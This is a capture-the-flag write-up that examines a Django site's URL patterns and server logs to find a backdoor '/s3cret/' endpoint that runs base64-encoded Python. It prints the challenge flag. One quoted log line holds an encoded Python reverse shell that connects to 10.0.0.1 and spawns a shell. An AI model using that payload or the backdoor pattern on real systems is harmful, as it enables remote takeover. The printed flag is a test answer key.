You can launch the website using "python manage.py runserver", although this is not necessary to solve the problem.

Trying to go to an invalid page gives us information about the server, including the
url patterns that the server is looking for:

^admin/
^/?$
^register/?$
^login/?$
^logout/?$
^posts/view/(?P<pk>[-_\w]+)/?$
^accounts/(?P<slug>[-_\w]+)/?$
^search/(?P<query>\w+)/$
^search/$
^s3cret/$
^media/(?P<path>.*)$

We only care about s3cret, since it looks the most suspicious. Grepping the logs for
s3cret, we find many queries to the page, which are all in base64.

site/server.log:[06/Sep/2015 22:21:50] "GET /s3cret/?lolimacmd=MSsx HTTP/1.1" 302 0
site/server.log:[06/Sep/2015 22:21:50] "GET /s3cret/?lolimacmd=aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjAuMC4xIiwxMjM0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTs= HTTP/1.1" 500 58098
site/server.log:[06/Sep/2015 22:21:50] "GET /s3cret/? HTTP/1.1" 302 0
site/server.log:[06/Sep/2015 22:21:50] "GET /s3cret/? HTTP/1.1" 302 0

If we decode the base64 for each of them, we get arbitrary python commands, presumably used to 'hack' the website.
However, we only care about the last one, which when decoded looks like this:

(lambda a='f',b='l',c='a',d='g',e='{',f='w',g='h',h='e',i='n',j='_',k='1',l='n',m='_',n='d',o='o',p='u',q='b',r='t',s='_',t='l',u='0',v='0',w='k',x='_',y='@',z='_',aa='t',ab='h',ac='e',ad='_',ae='l',af='0',ag='g',ah='s',ai='}': "lol")()

If you look at the characters that the variables are storing, you can see that they make up the flag.

flag{when_1n_doubt_l00k_@_the_l0gs}
